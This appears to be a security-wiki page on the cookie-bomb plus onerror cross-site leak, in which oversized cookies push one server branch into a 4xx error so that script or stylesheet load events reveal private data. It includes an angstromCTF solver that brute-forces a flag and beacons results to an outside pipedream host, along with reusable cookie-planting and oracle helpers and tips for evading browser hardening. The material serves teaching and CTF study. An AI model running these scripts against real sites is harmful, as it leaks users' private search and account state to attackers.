# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

This technique combines:
- Cookie bombing: stuffing the victim’s browser with many/large cookies for the target origin so that subsequent requests hit server/request limits (request header size, URL size in redirects, etc.).
- Error-event oracle: probing a cross-origin endpoint with a `<script>` (or other subresource) and distinguishing states with `onload` vs `onerror`.

High level idea
- Find a target endpoint whose behavior differs for two states you want to test (e.g., search “hit” vs “miss”).
- Ensure the “hit” path will trigger a heavy redirect chain or long URL while the “miss” path stays short. Inflate request headers using many cookies so that only the “hit” path causes the server to fail with an HTTP error (e.g., 431/414/400). The error flips the onerror event and becomes an oracle for XS-Search.

When does this work
- You can cause the victim browser to send cookies to the target (e.g., cookies are SameSite=None or you can set them in a first-party context via a popup `window.open`).
- There is an app feature you can abuse to set arbitrary cookies (e.g., “save preference” endpoints that turn controlled input names/values into Set-Cookie) or to make post-auth redirects that incorporate attacker-controlled data into the URL.
- The server reacts differently on the two states and, with inflated headers/URL, one state crosses a limit and returns an error response that triggers onerror.

Note on server errors used as the oracle
- 431 Request Header Fields Too Large is commonly returned when cookies inflate request headers; 414 URI Too Long or a server-specific 400 may be returned for long request targets. Any of these result in a failed subresource load and fire onerror. See [MDN’s 431 entry](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431) for typical causes like excessive cookies.

<details>
<summary>Practical example (angstromCTF 2022)</summary>

The following script (from a public writeup) abuses a feature that lets the attacker insert arbitrary cookies, then loads a cross-origin search endpoint as a script. When the query is correct, the server performs a redirect that, together with the cookie bloat, exceeds server limits and returns an error status, so script.onerror fires; otherwise nothing happens.

```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
  <input id="f" /><input name="search" value="a" />
</form>
<script>
  const $ = document.querySelector.bind(document)
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
  let i = 0
  const stuff = async (len = 3500) => {
    let name = Math.random()
    $("form").target = name
    let w = window.open("", name)
    $("#f").value = "_".repeat(len)
    $("#f").name = i++
    $("form").submit()
    await sleep(100)
  }
  const isError = async (url) => {
    return new Promise((r) => {
      let script = document.createElement("script")
      script.src = url
      script.onload = () => r(false)
      script.onerror = () => r(true)
      document.head.appendChild(script)
    })
  }
  const search = (query) => {
    return isError(
      "https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
    )
  }
  const alphabet =
    "etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
  const url = "//en4u1nbmyeahu.x.pipedream.net/"
  let known = "actf{"
  window.onload = async () => {
    navigator.sendBeacon(url + "?load")
    await Promise.all([stuff(), stuff(), stuff(), stuff()])
    await stuff(1600)
    navigator.sendBeacon(url + "?go")
    while (true) {
      for (let c of alphabet) {
        let query = known + c
        if (await search(query)) {
          navigator.sendBeacon(url, query)
          known += c
          break
        }
      }
    }
  }
</script>
```

</details>

Why the popup (`window.open`)?
- Modern browsers increasingly block third-party cookies. Opening a top-level window to the target makes cookies first‑party so Set-Cookie responses from the target will stick, enabling the cookie-bomb step even with third‑party cookie restrictions.

2024–2025 notes on cookie availability
- Chrome’s Tracking Protection rollout (January 2024) is already blocking third-party cookies for a random cohort and is slated to expand to the entire user base once the UK CMA signs off, so assume any victim can abruptly lose 3P cookies. Automate the fallback: detect when your script probe fails without ever hitting the target and transparently pivot to the popup/first-party flow. Safari and Firefox already block most third-party cookies by default and CHIPS/partitioned cookies mean each top-level site now has its own jar.
- Use a first‑party cookie planting flow (`window.open` + auto-submit to a cookie-setting endpoint) and then probe with a subresource that only succeeds when those cookies are sent. If third‑party cookies are blocked, move the probe into a same-site context (e.g., run the oracle in the popup via a same-site gadget and exfiltrate the boolean with `postMessage` or a beacon to your server), or enroll the victim origin in Chrome’s deprecation trial if you legitimately control it.

<details>
<summary>Tracking-Protection-safe first-party planting helper</summary>

When you need to stuff dozens of cookies from a cross-site context, stage a temporary top-level window and fire a series of oversized form submissions into the vulnerable Set-Cookie endpoint:
```js
async function plantFirstPartyCookies(endpoint, fields) {
  for (let i = 0; i < 5; i++) {
    const name = crypto.randomUUID();
    const form = Object.assign(document.createElement('form'), {action:endpoint, method:'POST', target:name});
    Object.entries(fields).forEach(([k, v]) => {
      const input = document.createElement('input');
      input.name = k;
      input.value = v + '_'.repeat(400 + 120 * i);
      form.appendChild(input);
    });
    document.body.appendChild(form);
    window.open('about:blank', name, 'noopener');
    form.submit();
    await new Promise(r => setTimeout(r, 120));
    form.remove();
  }
}
```
Call it right before you begin probing so every oracle run starts with a freshly inflated cookie jar.

</details>

Generic probing helper
If you already have a way to set many cookies on the target origin (first-party), you can reuse this minimal oracle against any endpoint whose success/failure leads to different network outcomes (status/MIME/redirect):

```js
function probeError(url) {
  return new Promise((resolve) => {
    const s = document.createElement('script');
    s.src = url;
    s.onload = () => resolve(false);  // loaded successfully
    s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
    document.head.appendChild(s);
  });
}
```

Alternative tag oracle (stylesheet)
```js
function probeCSS(url) {
  return new Promise((resolve) => {
    const l = document.createElement('link');
    l.rel = 'stylesheet';
    l.href = url;
    l.onload = () => resolve(false);
    l.onerror = () => resolve(true);
    document.head.appendChild(l);
  });
}
```

Advanced: de Bruijn–based cookie packing (CTF-proven)
- When the app lets you control large cookie values, you can pack guesses efficiently by appending a de Bruijn sequence to each probe. This keeps per‑probe overhead small while ensuring the heavy branch is consistently heavier only for the right prefix. Example generator for |Σ| symbols of length n (fits in a cookie value):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
  const a = Array(k * n).fill(0), seq=[];
  (function db(t,p){
    if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
    else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
  })(1,1);
  return seq.map(i=>alphabet[i]).join('');
}
```
- Idea in practice: set multiple cookies whose values are prefix + deBruijn(k,n). Only when the tested prefix is correct does the server take the heavy path (e.g., extra redirect reflecting the long cookie or URL), which, combined with the cookie bloat, crosses limits and flips onerror. See a LA CTF 2024 public solver using this approach.

Tips to build the oracle
- Force the “positive” state to be heavier: chain an extra redirect only when the predicate is true, or make the redirect URL reflect unbounded user input so it grows with the guessed prefix.
- Inflate headers: repeat cookie bombing until a consistent error is observed on the “heavy” path. Servers commonly cap header size and will fail sooner when many cookies are present.
- Stabilize: fire multiple parallel cookie set operations and probe repeatedly to average out timing and caching noise.
- Bust caches and avoid pooling artifacts: add a random `#fragment` or `?r=` to probe URLs, and prefer distinct window names when using `window.open` loops.
- Alternate subresources: if `<script>` is filtered, try `<link rel=stylesheet>` or `<img>`. The onload/onerror boolean is the oracle; content never needs to be parsed.

Common header/URL limits (useful thresholds)
- Reverse proxies/CDNs and servers enforce different caps. As of October 2025, Cloudflare documents 128 KB total for request headers (and 16 KB URL) on the edge, so you may need more/larger cookies when targets sit behind it. Other stacks (e.g., Apache via LimitRequestFieldSize) are often closer to ~8 KB per header line and will hit errors earlier. Adjust bomb size accordingly (see [Cloudflare’s documented limit](https://developers.cloudflare.com/fundamentals/reference/connection-limits/)).

Browser hardening watchlist (2025+)
- Firefox 139/ESR 128.11 (May 2025) tightened script tag load/error accounting for cross-origin resources (CVE-2025-5266). On patched clients the `onerror` signal for certain redirected responses is suppressed, so diversify the oracle (parallel `<link rel=stylesheet>`, `<img>`, or `fetch` with mismatched MIME) and fingerprint the victim UA before assuming the boolean still fires.
- Expect enterprise Chromium builds with Tracking Protection or Fetch Metadata policies to intermittently strip cookies or rewrite redirects. Detect these cases by probing a short endpoint first; when it fails, automatically pivot to running the entire attack inside the popup and relaying bits through `postMessage`/`BroadcastChannel`.

Related XS-Search tricks
- URL length based oracles (no cookies needed) can be combined or used instead when you can force a very long request target:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Notes
- This class of attacks is discussed broadly as “Error Events” XS-Leaks. The cookie-bomb step is just a convenient way to push only one branch over server limits, producing a reliable boolean oracle.



## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
- Chrome Tracking Protection rollout details: https://blog.google/products/chrome/privacy-sandbox-tracking-protection/
- Mozilla MFSA 2025-44 (CVE-2025-5266) tightening script tag onerror behavior: https://www.mozilla.org/en-US/security/advisories/mfsa2025-44/
{{#include ../../banners/hacktricks-training.md}}
